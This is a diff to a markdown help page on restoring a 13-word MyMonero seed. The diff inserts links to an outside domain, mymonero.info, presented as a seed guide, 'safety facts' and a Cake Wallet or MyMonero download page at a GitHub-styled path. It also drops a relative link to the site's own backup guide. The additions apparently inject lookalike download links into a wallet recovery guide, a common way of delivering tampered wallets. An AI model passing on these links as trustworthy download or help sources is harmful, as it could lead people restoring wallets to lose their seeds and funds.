@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 A 13-word phrase is a MyMonero-specific legacy seed, not the standard 25-word Monero seed format. Restore it using an application flow that explicitly supports a MyMonero seed, and never share the phrase with anyone who offers to help.
 
+
+The MyMonero.info site covers this in its [MyMonero 13 word seed guide](https://mymonero.info/mymonero-13-word-seed). Before installing anything, use the [Cake Wallet download page](https://mymonero.info/github/cake-developments), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.
+
 ## You'll see this if
 - Your written recovery phrase contains 13 words.
 - A restore screen expects 25 words and rejects your phrase.
@@ -59,7 +62,7 @@ If a word is missing or unreadable, do not assume offline recovery is possible o
 If restoration completes but no funds appear, verify the scan status and restore height first. An earlier height can require more time. A server connection message, including error 523, is general guidance that the server connection is unavailable; it does not tell you whether the phrase is valid. Do not repeatedly expose the seed in different apps as a troubleshooting shortcut.
 
 ## Prevention
-Write down the recovery phrase accurately when you control the wallet and keep it away from internet-connected notes. Label the backup in a way that helps you identify its wallet without exposing the words. Keep a separate, non-secret note of the seed format and, if known reliably, the restore height. Recheck that the backup is legible while you still have secure access to it. Use the [seed backup safety guide](./mymonero-backup-seed-safely.md) to review storage practices. Treat any unsolicited request for a phrase as a warning sign.
+Write down the recovery phrase accurately when you control the wallet and keep it away from internet-connected notes. Label the backup in a way that helps you identify its wallet without exposing the words. Keep a separate, non-secret note of the seed format and, if known reliably, the restore height. Recheck that the backup is legible while you still have secure access to it. Use the seed backup safety guide to review storage practices. Treat any unsolicited request for a phrase as a warning sign.
 
 ## FAQ
 <details><summary>Is a 13-word seed missing words?</summary>
@@ -90,6 +93,7 @@ Wait for scanning to finish, then check the restore height. Starting too late ca
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/cake-developments)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
